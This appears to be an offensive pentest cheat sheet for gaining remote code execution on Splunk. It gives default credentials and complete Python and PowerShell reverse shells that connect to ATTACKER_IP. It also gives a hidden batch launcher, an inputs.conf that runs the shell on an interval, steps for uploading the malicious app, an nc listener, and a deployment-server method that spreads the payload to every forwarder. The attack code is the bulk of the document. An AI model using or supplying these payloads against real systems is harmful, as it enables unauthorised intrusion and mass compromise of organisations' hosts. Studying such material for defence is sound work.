# Splunk

## Discovery

- Default port: 8000
- Often runs as root (Linux) or SYSTEM (Windows)
- Default creds: `admin:changeme`

---

## Custom App RCE (Authenticated)

### Create Malicious App Structure

```bash
mkdir -p splunk_shell/bin splunk_shell/default
```

### Linux - rev.py

```python
import sys,socket,os,pty

ip="ATTACKER_IP"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

### Windows - run.ps1

```powershell
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Windows - run.bat

```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

### inputs.conf

```ini
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

### Package and Upload

```bash
# Create tarball
tar -cvzf updater.tar.gz splunk_shell/

# Upload via Splunk Web UI
# Apps → Install app from file → Upload
```

### Catch Shell

```bash
nc -lvnp 443
```

---

## Deployment Server Pivot

If compromised host is a deployment server:

```bash
# Place app in deployment-apps for mass RCE
$SPLUNK_HOME/etc/deployment-apps/
```

All hosts with Universal Forwarders will execute the payload.

---

## Pre-built Reverse Shell Package

https://github.com/0xjpuff/reverse_shell_splunk
